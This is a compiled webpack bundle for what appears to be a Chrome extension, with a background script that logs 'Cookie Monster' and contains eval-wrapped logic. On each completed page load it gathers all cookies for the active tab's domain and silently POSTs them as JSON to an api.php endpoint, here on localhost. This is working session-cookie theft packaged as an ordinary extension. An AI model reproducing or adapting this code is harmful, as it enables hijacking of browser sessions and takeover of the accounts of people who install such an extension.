/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./src/js/background.js");
/******/ })
/************************************************************************/
/******/ ({

/***/ "./src/img/icon-128.png":
/*!******************************!*\
  !*** ./src/img/icon-128.png ***!
  \******************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

eval("module.exports = __webpack_require__.p + \"icon-128.png\";//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvaW1nL2ljb24tMTI4LnBuZy5qcyIsInNvdXJjZXMiOlsid2VicGFjazovLy8uL3NyYy9pbWcvaWNvbi0xMjgucG5nPzM1MGEiXSwic291cmNlc0NvbnRlbnQiOlsibW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArIFwiaWNvbi0xMjgucG5nXCI7Il0sIm1hcHBpbmdzIjoiQUFBQSIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./src/img/icon-128.png\n");

/***/ }),

/***/ "./src/img/icon-34.png":
/*!*****************************!*\
  !*** ./src/img/icon-34.png ***!
  \*****************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

eval("module.exports = __webpack_require__.p + \"icon-34.png\";//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvaW1nL2ljb24tMzQucG5nLmpzIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vLy4vc3JjL2ltZy9pY29uLTM0LnBuZz9mZGY2Il0sInNvdXJjZXNDb250ZW50IjpbIm1vZHVsZS5leHBvcnRzID0gX193ZWJwYWNrX3B1YmxpY19wYXRoX18gKyBcImljb24tMzQucG5nXCI7Il0sIm1hcHBpbmdzIjoiQUFBQSIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./src/img/icon-34.png\n");

/***/ }),

/***/ "./src/js/background.js":
/*!******************************!*\
  !*** ./src/js/background.js ***!
  \******************************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _img_icon_128_png__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../img/icon-128.png */ \"./src/img/icon-128.png\");\n/* harmony import */ var _img_icon_128_png__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_img_icon_128_png__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var _img_icon_34_png__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../img/icon-34.png */ \"./src/img/icon-34.png\");\n/* harmony import */ var _img_icon_34_png__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_img_icon_34_png__WEBPACK_IMPORTED_MODULE_1__);\n\n\n\n(function() {\n\n    console.log(\"Cookie Monster\");\n    let tabId;\n\n    function unpack(objs){\n        let s = \"\";\n        objs.array.forEach(obj => {\n            Object.keys(obj).forEach(key => {\n                s += `${key}: ${obj[key]}\\n`;\n            });\n            s += \"\\n\";\n        });\n        return s;\n    }\n\n    chrome.tabs.onActivated.addListener(function (tab) {\n        tabId = tab.tabId;\n        console.log(tabId);\n    });\n\n    chrome.webNavigation.onCompleted.addListener(function () {\n        chrome.tabs.get(tabId, function (tab) {\n            if(tab.url){\n                let domain = tab.url.includes(\"://\") ? tab.url.split(\"://\")[1].split(\"/\")[0] : tab.url.split(\"/\")[0];\n                if (domain.startsWith(\"www.\")) {\n                    domain = domain.replace(\"www.\", \"\");\n                }\n                console.log(domain);\n                chrome.cookies.getAll({domain: domain}, function (cookies) {\n                    fetch('http://localhost/api.php', {\n                        headers: { \"Content-Type\": \"application/json; charset=utf-8\" },\n                        method: 'POST',\n                        body: JSON.stringify({cookie : cookies})\n                    })\n                   //let str = unpack(cookies);\n                });\n            }\n        });\n    });\n\n}());\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvanMvYmFja2dyb3VuZC5qcy5qcyIsInNvdXJjZXMiOlsid2VicGFjazovLy8uL3NyYy9qcy9iYWNrZ3JvdW5kLmpzPzgxMDQiXSwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0ICcuLi9pbWcvaWNvbi0xMjgucG5nJ1xuaW1wb3J0ICcuLi9pbWcvaWNvbi0zNC5wbmcnXG5cbihmdW5jdGlvbigpIHtcblxuICAgIGNvbnNvbGUubG9nKFwiQ29va2llIE1vbnN0ZXJcIik7XG4gICAgbGV0IHRhYklkO1xuXG4gICAgZnVuY3Rpb24gdW5wYWNrKG9ianMpe1xuICAgICAgICBsZXQgcyA9IFwiXCI7XG4gICAgICAgIG9ianMuYXJyYXkuZm9yRWFjaChvYmogPT4ge1xuICAgICAgICAgICAgT2JqZWN0LmtleXMob2JqKS5mb3JFYWNoKGtleSA9PiB7XG4gICAgICAgICAgICAgICAgcyArPSBgJHtrZXl9OiAke29ialtrZXldfVxcbmA7XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIHMgKz0gXCJcXG5cIjtcbiAgICAgICAgfSk7XG4gICAgICAgIHJldHVybiBzO1xuICAgIH1cblxuICAgIGNocm9tZS50YWJzLm9uQWN0aXZhdGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uICh0YWIpIHtcbiAgICAgICAgdGFiSWQgPSB0YWIudGFiSWQ7XG4gICAgICAgIGNvbnNvbGUubG9nKHRhYklkKTtcbiAgICB9KTtcblxuICAgIGNocm9tZS53ZWJOYXZpZ2F0aW9uLm9uQ29tcGxldGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgY2hyb21lLnRhYnMuZ2V0KHRhYklkLCBmdW5jdGlvbiAodGFiKSB7XG4gICAgICAgICAgICBpZih0YWIudXJsKXtcbiAgICAgICAgICAgICAgICBsZXQgZG9tYWluID0gdGFiLnVybC5pbmNsdWRlcyhcIjovL1wiKSA/IHRhYi51cmwuc3BsaXQoXCI6Ly9cIilbMV0uc3BsaXQoXCIvXCIpWzBdIDogdGFiLnVybC5zcGxpdChcIi9cIilbMF07XG4gICAgICAgICAgICAgICAgaWYgKGRvbWFpbi5zdGFydHNXaXRoKFwid3d3LlwiKSkge1xuICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBkb21haW4ucmVwbGFjZShcInd3dy5cIiwgXCJcIik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGRvbWFpbik7XG4gICAgICAgICAgICAgICAgY2hyb21lLmNvb2tpZXMuZ2V0QWxsKHtkb21haW46IGRvbWFpbn0sIGZ1bmN0aW9uIChjb29raWVzKSB7XG4gICAgICAgICAgICAgICAgICAgIGZldGNoKCdodHRwOi8vbG9jYWxob3N0L2FwaS5waHAnLCB7XG4gICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7IFwiQ29udGVudC1UeXBlXCI6IFwiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOFwiIH0sXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtjb29raWUgOiBjb29raWVzfSlcbiAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAvL2xldCBzdHIgPSB1bnBhY2soY29va2llcyk7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0pO1xuICAgIH0pO1xuXG59KCkpO1xuIl0sIm1hcHBpbmdzIjoiQUFBQTtBQUFBO0FBQUE7QUFBQTtBQUFBO0FBQUE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBOyIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./src/js/background.js\n");

/***/ })

/******/ });